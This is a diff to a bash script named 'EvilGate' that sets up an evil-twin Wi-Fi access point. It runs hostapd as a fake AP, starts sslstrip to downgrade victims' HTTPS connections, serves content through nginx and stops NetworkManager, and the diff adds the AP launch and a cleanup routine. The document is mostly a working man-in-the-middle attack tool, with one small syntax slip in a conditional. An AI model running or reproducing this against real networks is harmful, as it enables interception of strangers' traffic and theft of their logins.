@@ -1,6 +1,17 @@
 #!/usr/bin/bash
 # EvilGate by Pascal3366
 
+Exit() {
+  echo "Cleaning up stuff..."
+  killall hostapd
+  killall sslstrip
+  stop_service "nginx"
+  start_service "NetworkManager"
+  exit
+}
+
+trap Exit SIGINT
+
 if [ "$EUID" -ne 0 ]
   then echo "This script has to be run as root"
   exit
@@ -108,6 +119,14 @@ start_service() {
   fi
 }
 
+stop_service() {
+  if [ "$SYSTEMINITDAEMON" = "systemd" ]; then
+    systemctl stop $1
+  elif ["$SYSTEMINITDAEMON" = "upstart" ]; then
+    /etc/init.d/$1 stop
+  fi
+}
+
 detect_init
 detect_package_manager
 
@@ -120,4 +139,12 @@ install_requirements
 echo "Starting nginx"
 start_service "nginx"
 echo "Starting sslstrip"
-sslstrip --listen=$SSLSTRIP_PORT >/dev/null 2>/dev/null
+exec sslstrip --listen=$SSLSTRIP_PORT &>/dev/null &
+echo "Stopping NetworkManager"
+stop_service "NetworkManager"
+echo "Setting up FakeAP using hostapd..."
+exec hostapd -B -d hostapd.conf &>/dev/null &
+
+read -p "Script is running press any key to cancel..."
+
+Exit
